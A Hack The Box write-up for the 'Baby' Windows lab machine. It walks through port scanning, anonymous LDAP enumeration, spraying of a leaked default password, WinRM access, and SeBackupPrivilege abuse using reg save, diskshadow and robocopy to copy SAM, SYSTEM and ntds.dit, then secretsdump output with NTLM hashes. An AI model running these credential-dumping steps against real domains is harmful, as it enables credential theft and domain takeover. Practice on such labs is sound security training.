
# Baby (Easy,Windows)

Today. We will hack a machine from hackthebox named Baby (Easy,Windows) machine. Let's start it without wasting time!

## Reconnaissance

Every hacker has own methodology by using first scanning tool , I prefer using rustscan firstly then shifting to nmap . 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ cat rustscan.out
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.234.71:53
Open 10.129.234.71:88
Open 10.129.234.71:135
Open 10.129.234.71:139
Open 10.129.234.71:389
Open 10.129.234.71:445
Open 10.129.234.71:464
Open 10.129.234.71:593
Open 10.129.234.71:636
Open 10.129.234.71:3268
Open 10.129.234.71:3269
Open 10.129.234.71:3389
Open 10.129.234.71:5985
Open 10.129.234.71:9389
Open 10.129.234.71:49340
Open 10.129.234.71:49341
Open 10.129.234.71:49664
Open 10.129.234.71:49668
Open 10.129.234.71:57593
Open 10.129.234.71:61431
Open 10.129.234.71:61443
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 14:48 +0400
Initiating Ping Scan at 14:48
Scanning 10.129.234.71 [4 ports]
Completed Ping Scan at 14:48, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:48
Completed Parallel DNS resolution of 1 host. at 14:48, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:48
Scanning 10.129.234.71 [21 ports]
Discovered open port 57593/tcp on 10.129.234.71
Discovered open port 53/tcp on 10.129.234.71
Discovered open port 445/tcp on 10.129.234.71
Discovered open port 5985/tcp on 10.129.234.71
Discovered open port 3269/tcp on 10.129.234.71
Discovered open port 139/tcp on 10.129.234.71
Discovered open port 135/tcp on 10.129.234.71
Discovered open port 3389/tcp on 10.129.234.71
Discovered open port 49668/tcp on 10.129.234.71
Discovered open port 61443/tcp on 10.129.234.71
Discovered open port 3268/tcp on 10.129.234.71
Discovered open port 464/tcp on 10.129.234.71
Discovered open port 49340/tcp on 10.129.234.71
Discovered open port 49341/tcp on 10.129.234.71
Discovered open port 636/tcp on 10.129.234.71
Discovered open port 49664/tcp on 10.129.234.71
Discovered open port 9389/tcp on 10.129.234.71
Discovered open port 61431/tcp on 10.129.234.71
Discovered open port 88/tcp on 10.129.234.71
Discovered open port 593/tcp on 10.129.234.71
Discovered open port 389/tcp on 10.129.234.71
Completed SYN Stealth Scan at 14:48, 0.36s elapsed (21 total ports)
Nmap scan report for 10.129.234.71
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2026-03-26 14:48:20 +04 for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49340/tcp open  unknown          syn-ack ttl 127
49341/tcp open  unknown          syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
57593/tcp open  unknown          syn-ack ttl 127
61431/tcp open  unknown          syn-ack ttl 127
61443/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
           Raw packets sent: 25 (1.076KB) | Rcvd: 22 (952B)
```

Perfect. now it is time for nmap to know which services and their version running on this ports. 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ nmap -A 10.129.234.71         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 14:50 +0400
Nmap scan report for 10.129.234.71
Host is up (0.32s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-26 10:50:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-26T10:51:00+00:00
|_ssl-date: 2026-03-26T10:51:40+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-03-25T10:42:23
|_Not valid after:  2026-09-24T10:42:23
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-26T10:51:00
|_  start_date: N/A
|_clock-skew: mean: -52s, deviation: 0s, median: -52s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   432.37 ms 10.10.14.1
2   432.60 ms 10.129.234.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.85 seconds
```

## Enumeration

Every time first checking smb shares on Windows machines is core action on every situtation. AND there are many variation on tools in enumerating these shares such as smbclient,crackmapexec(cme),netexec(nxe),enum4linux,smbmap and so many.

Let's use netexec.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ netexec smb 10.129.234.71 -u '' -p '' --shares                          
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.71   445    BABYDC           [+] baby.vl\: 
SMB         10.129.234.71   445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ sudo nano /etc/hosts                                
[sudo] password for samurai: 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ netexec smb 10.129.234.71 -u 'guest' -p '' --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                                                                                              
```

But unfourtunately we found nothing from shares for this time , maybe we need a valid credentials to enumerate these shares soon. 
Okay , lets move the ldap enumeration. but first we need to know what is LDAP : 

Lightweight Directory Access Protocol (LDAP)
is an open, vendor-neutral, industry-standard application protocol used to query, manage, and authenticate user identities and resources within a directory service over an IP network. It enables centralized management of users, passwords, and access rights, typically used in environments like Active Directory to simplify network security and resource access.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ ldapsearch -x -H ldap://baby.vl -b 'dc=baby,dc=vl'
# extended LDIF
#
# LDAPv3
# base <dc=baby,dc=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
[...SNIP...]
```

Explanation:

    -x : Simple authentication
    -h : Target IP or hostname
    -b : Base DN (Domain Name)

Here we see that it is too long and hard to understand what data here is important for us. Lets filter these with some beautiful commands

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ ldapsearch -x -H ldap://baby.vl -b 'dc=baby,dc=vl'  | grep sAMAccountName
sAMAccountName: Guest
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: dev
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: it
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell
```

Perfect , It is much more helpful for us. 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ ldapsearch -x -H ldap://baby.vl -b 'dc=baby,dc=vl'  | grep sAMAccountName | cut -d':' -f2 | tr -d ' ' > users.txt
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ cat users.txt                                                                                   
Guest
DomainComputers
CertPublishers
DomainUsers
DomainGuests
GroupPolicyCreatorOwners
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
EnterpriseRead-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
DnsAdmins
DnsUpdateProxy
dev
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

Now we have the valid users from LDAP enumeration. But the most important thing we forgot that Teresa Bell user exposed credentials on Description field which is BabyStart123!

Now we can enumerate SMB shares again!! : 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ netexec smb 10.129.234.71 -u users.txt -p 'BabyStart123!' --shares 
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainComputers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\CertPublishers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainUsers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainGuests:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\GroupPolicyCreatorOwners:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\RASandIASServers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\AllowedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DeniedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\EnterpriseRead-onlyDomainControllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\CloneableDomainControllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\ProtectedUsers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DnsAdmins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DnsUpdateProxy:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
```

But we see from these users dont user default credentials. On the other hand , we observed that there is additional two users from dev OU as following: 


```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://baby.vl | grep dn 
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

On next, again trying to enumerate SMB Shares with additional these two users found from dev
```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ netexec smb 10.129.234.71 -u users.txt -p 'BabyStart123!' --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainComputers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\CertPublishers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainUsers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DomainGuests:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\GroupPolicyCreatorOwners:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\RASandIASServers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\AllowedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DeniedRODCPasswordReplicationGroup:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\EnterpriseRead-onlyDomainControllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\CloneableDomainControllers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\ProtectedUsers:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DnsAdmins:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\DnsUpdateProxy:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.234.71   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```                                                                                                                                      
                                                                                                                                        
Perfect , Caroline.Robinson did not changes default password yet.But to access this user we have to change its password due to expiration

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ smbpasswd -U baby.vl/caroline.robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ netexec winrm 10.129.234.71 -u 'Caroline.Robinson' -p 'Password123'  
WINRM       10.129.234.71   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.71   5985   BABYDC           [+] baby.vl\Caroline.Robinson:Password123 (Pwn3d!)
```

After successfully changing the password we access the system with evil-winrm tool and obtain the user flag

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ evil-winrm -i baby.vl -u Caroline.Robinson -p 'Password123'        
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..\Desktop\
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt
5c5e520a6191f5c46f3ada64cda4bcac
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> 
```

## Privilege Escalation

The first command in windows system to check our compromised user's rights is whoami/priv and the output is 
```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> 

```
SeBackupPrivilege is dangerous right for normal user on system which leads to Unauthenticated access to Administrator Privilege
A user with this privilege can create a full backup of the entire system, including sensitive files like the Security Account Manager (SAM) and the Active Directory database “NT Directory Services. Directory Information Tree” (NTDS.dit).

On evil-winrm Powershell session , run these commands in order -> 
```bash
*Evil-WinRM* PS C:\temp> reg save hklm\sam sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system system.save
The operation completed successfully.

*Evil-WinRM* PS C:\temp> download sam.save
                                        
Info: Downloading C:\temp\sam.save to sam.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.save
                                        
Info: Downloading C:\temp\system.save to system.save
                                        
Info: Download successful!
```

Then try to get NTLM hashes 
```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ impacket-secretsdump -sam sam.save -system system.save LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

But we cant get access to Administrator user with this method. Then we need to use diskshadow method 
Diskshadow and Robocopy. Diskshadow creates copies of a currently used drive, while Robocopy copies files and directories from one location to another.

```bash
echo 'set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
' > back_script.txt
```

Then download this to the target and execute these commands -> 
```bash
*Evil-WinRM* PS C:\temp> (Get-Content back_script.txt) | Set-Content back_script.txt
*Evil-WinRM* PS C:\temp> diskshadow /s ./back_script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  3/26/2026 12:04:16 PM

-> set verbose on
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
	+ Adding component: \PerformanceCounters

* Including writer "System Writer":
	+ Adding component: \System Files
	+ Adding component: \Win32 Services Files

* Including writer "ASR Writer":
	+ Adding component: \ASR\ASR
	+ Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
	+ Adding component: \Disks\harddisk0
	+ Adding component: \BCD\BCD

* Including writer "Registry Writer":
	+ Adding component: \Registry

* Including writer "DFS Replication service writer":
	+ Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "WMI Writer":
	+ Adding component: \WMI

* Including writer "COM+ REGDB Writer":
	+ Adding component: \COM+ REGDB

* Including writer "NTDS":
	+ Adding component: \C:_Windows_NTDS\ntds

Alias cdrive for shadow ID {87e99ce1-0e76-4ed9-81e1-ab1568c3259f} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {ad514be4-18ab-4b89-aee0-7aa683da91e9} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file BCDocument.xml into .cab file test.cab
Inserted file WM0.xml into .cab file test.cab
Inserted file WM1.xml into .cab file test.cab
Inserted file WM2.xml into .cab file test.cab
Inserted file WM3.xml into .cab file test.cab
Inserted file WM4.xml into .cab file test.cab
Inserted file WM5.xml into .cab file test.cab
Inserted file WM6.xml into .cab file test.cab
Inserted file WM7.xml into .cab file test.cab
Inserted file WM8.xml into .cab file test.cab
Inserted file WM9.xml into .cab file test.cab
Inserted file WM10.xml into .cab file test.cab
Inserted file Dis639F.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {ad514be4-18ab-4b89-aee0-7aa683da91e9}

	* Shadow copy ID = {87e99ce1-0e76-4ed9-81e1-ab1568c3259f}		%cdrive%
		- Shadow copy set: {ad514be4-18ab-4b89-aee0-7aa683da91e9}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 3/26/2026 12:04:38 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {87e99ce1-0e76-4ed9-81e1-ab1568c3259f}
The shadow copy was successfully exposed as E:\.
->
*Evil-WinRM* PS C:\temp> 
```

Perfect! Next step is using robocopy do extract ntds hive and then download it to our attacker machine.

```bash
robocopy /b E:\Windows\ntds . ntds.dit
download ntds.dit
```

Next We will use secretsdump tool from impacket to extract hashes. It allows the extraction of secrets (NTDS.dit, SAM and .SYSTEM registry hives) from multiple Windows systems simultaneously

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Baby]
└─$ impacket-secretsdump -sam sam.save -system system.save -ntds ntds.dit LOCAL 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
